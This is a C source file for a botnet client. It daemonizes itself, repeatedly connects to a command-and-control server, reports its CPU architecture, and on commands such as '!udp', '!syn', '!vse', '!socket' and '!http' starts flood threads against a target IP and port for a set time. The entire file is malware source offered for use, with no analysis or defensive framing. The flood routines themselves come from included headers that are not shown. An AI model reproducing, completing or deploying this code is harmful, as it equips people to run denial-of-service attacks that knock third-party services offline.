#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <time.h>
#include "syn_attack.h"
#include "udp_attack.h"
#include "http_attack.h"
#include "socket_attack.h"
#include "vse_attack.h"
#include "attack_params.h"
#include "daemon.h"

#define CNC_IP "0.0.0.0"
#define BOT_PORT 1338
#define MAX_THREADS 1

const char* get_arch() {
    #if defined(__aarch64__)
    return "aarch64";
    #elif defined(__arm__)
    return "arm";
    #elif defined(__m68k__)
    return "m68k";
    #elif defined(__mips__)
    return "mips";
    #elif defined(__mipsel__)
    return "mipsel";
    #elif defined(__powerpc64__)
    return "powerpc64";
    #elif defined(__sh__)
    return "sh4";
    #elif defined(__sparc__)
    return "sparc";
    #elif defined(__x86_64__)
    return "x86_64";
    #elif defined(__i386__)
    return "i686";
    #else
    return "unknown";
    #endif
}

void handle_command(const char *command, int sock) {
    static attack_params* params = NULL;
    static pthread_t threads[MAX_THREADS];
    const char* arch = get_arch();
    if (strcmp(command, "ping") == 0) {
        char buffer[256];
        snprintf(buffer, sizeof(buffer), "pong %s", arch);
        send(sock, buffer, strlen(buffer), 0);
    } else if (strncmp(command, "!udp", 4) == 0 || strncmp(command, "!vse", 4) == 0 || strncmp(command, "!syn", 4) == 0 || strncmp(command, "!socket", 7) == 0 || strncmp(command, "!http", 5) == 0) {
        char ip[20];
        int port, time;
        if (sscanf(command + 5, "%s %d %d", ip, &port, &time) == 3) {
            if (params != NULL) {
                params->active = 0;
                for (int i = 0; i < MAX_THREADS; i++) {
                    pthread_cancel(threads[i]);
                }
                free(params);
            }
            params = malloc(sizeof(attack_params));
            params->target_addr.sin_family = AF_INET;
            params->target_addr.sin_port = htons(port);
            inet_pton(AF_INET, ip, &params->target_addr.sin_addr);
            params->duration = time;
            params->active = 1;

            if (strncmp(command, "!udp", 4) == 0) {
                for (int i = 0; i < MAX_THREADS; i++) {
                    pthread_create(&threads[i], NULL, udp_attack, params);
                }
            } else if (strncmp(command, "!vse", 4) == 0) {
                for (int i = 0; i < MAX_THREADS; i++) {
                    pthread_create(&threads[i], NULL, vse_attack, params);
                }
            } else if (strncmp(command, "!syn", 4) == 0) {
                for (int i = 0; i < MAX_THREADS; i++) {
                    pthread_create(&threads[i], NULL, syn_attack, params);
                }
            } else if (strncmp(command, "!socket", 7) == 0) {
                for (int i = 0; i < MAX_THREADS; i++) {
                    pthread_create(&threads[i], NULL, socket_attack, params);
                }
            } else if (strncmp(command, "!http", 5) == 0) {
                for (int i = 0; i < MAX_THREADS; i++) {
                    pthread_create(&threads[i], NULL, http_attack, params);
                }
            }
            sleep(time);
            params->active = 0;
            for (int i = 0; i < MAX_THREADS; i++) {
                pthread_cancel(threads[i]);
            }
            free(params);
            params = NULL;
        }
    } else if (strcmp(command, "stop") == 0) {
        if (params != NULL) {
            params->active = 0;
            for (int i = 0; i < MAX_THREADS; i++) {
                pthread_cancel(threads[i]);
            }
            free(params);
            params = NULL;
        }
    }
}

int main(int argc, char** argv) {
    daemonize(argc, argv);

    int sock;
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(BOT_PORT);
    inet_pton(AF_INET, CNC_IP, &server_addr.sin_addr);

    int attempts = 0;
    while (attempts < 8) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            return 1;
        }

        int optval = 1;
        if (setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval)) < 0) {
            close(sock);
            return 1;
        }

        if (setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &optval, sizeof(optval)) < 0) {
            close(sock);
            return 1;
        }

        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            close(sock);
            attempts++;
            sleep(5);
            continue;
        }

        attempts = 0;

        char buffer[1024];
        while (1) {
            memset(buffer, 0, sizeof(buffer));
            int len = recv(sock, buffer, sizeof(buffer), 0);
            if (len <= 0) {
                close(sock);
                break;
            }
            handle_command(buffer, sock);
        }
    }

    close(sock);
    return 0;
}
